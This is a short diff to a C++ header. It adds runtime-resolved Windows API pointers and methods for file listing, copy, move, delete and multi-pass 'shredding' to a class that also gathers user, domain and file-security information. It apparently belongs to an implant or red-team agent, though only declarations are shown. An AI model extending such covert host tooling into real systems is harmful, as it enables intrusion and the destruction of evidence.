@@ -232,6 +232,17 @@ struct LoadedFunctions
     HANDLE (*FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
     BOOL (*FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
     BOOL (*FindClose)(HANDLE hFindFile);
+    DWORD (*GetFileAttributesA)(LPCSTR lpFileName);
+    BOOL (*CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
+    BOOL (*CreateDirectoryA)(LPCSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
+    BOOL (*FileTimeToSystemTime)(FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime);
+    int (*GetDateFormatEx)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpDate, LPCWSTR lpFormat, LPWSTR lpDateStr, int cchDate, LPCWSTR lpCalendar);
+    int (*GetTimeFormatEx)(LPCWSTR lpLocaleName, DWORD dwFlags, SYSTEMTIME *lpTime, LPCWSTR lpFormat, LPWSTR lpTimeStr, int cchTime);
+    BOOL (*MoveFileExA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, DWORD dwFlags);
+    BOOL (*SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
+    BOOL (*WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
+    BOOL (*DeleteFileA)(LPCSTR lpFileName);
+    BOOL (*RemoveDirectoryA)(LPCSTR lpPathName);
 };
 
 /* Class for WinAPI functions */
@@ -261,11 +272,18 @@ public:
     void GetUserNameCustom(OUT LPVOID *ppUserName, OUT LPVOID *ppDomainName);
     PCHAR GetCurrentWorkingDirectoryCustom();
     BOOL ChangeCurrentWorkingDirectoryCustom(PCHAR dirPath);
-    LPVOID ReadFileCustom(PCHAR filePath);
+    LPVOID ReadFileCustom(IN PCHAR filePath, OUT PDWORD64 pNumOfBytesRead);
     BOOL WriteFileCustom(PCHAR filePath, LPVOID whatToWrite, DWORD64 whatToWriteSize);
     BOOL ListDirectoryCustom(IN PCHAR dirPath, OUT WIN32_FIND_DATAA **ppDirListing, OUT PDWORD pDirListingSize);
     void GetFileSecurityInformationCustom(IN PCHAR filePath, OUT PSECURITY_INFO_CUSTOM pSecurityInfoCustom);
     void AccessMaskToAccessMaskCustom(IN SECURABLE_OBJECT_TYPE_CUSTOM objectType, IN ACCESS_MASK accessMask, OUT PACCESS_MASK_CUSTOM pAccessMaskCustom);
     void GetObjectSecurityInfoCustom(IN HANDLE hResource, IN SECURABLE_OBJECT_TYPE_CUSTOM objectType, OUT PSECURITY_INFO_CUSTOM pSecurityInfoCustom);
     void DescribeSecurityInfoCustom(IN PSECURITY_INFO_CUSTOM pSecurityInfoCustom, OUT CHAR **ppSecurityInfoCustomDescribed);
+    void DescribeDirectoryListingCustom(IN WIN32_FIND_DATAA *pDirListing, IN DWORD dirListingSize, OUT CHAR **ppOutput);
+    void SystemTimeToHumanFormat(IN PSYSTEMTIME pSystemTime, OUT PCHAR pHumanFormatTimestamp);
+    void FileTimeToHumanFormat(IN PFILETIME pFileTime, OUT PCHAR pHumanFormatTimestamp);
+    BOOL CopyFileCustom(PCHAR sourcePath, PCHAR destPath);
+    BOOL MoveFileCustom(PCHAR sourcePath, PCHAR destPath);
+    BOOL DeleteFileOrDirCustom(PCHAR filePath);
+    BOOL ShredFileCustom(PCHAR filePath, DWORD cycles);
 };
